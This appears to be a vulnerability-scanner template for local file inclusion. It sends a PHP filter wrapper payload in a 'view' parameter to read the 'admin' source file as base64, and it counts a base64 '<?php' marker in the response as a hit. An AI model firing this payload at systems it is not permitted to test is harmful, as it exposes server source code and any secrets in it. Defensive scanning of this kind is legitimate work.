id: lfi5-086
name: 'Wrapper php via view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via php wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - 'php://filter/convert.base64-encode/resource=admin'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
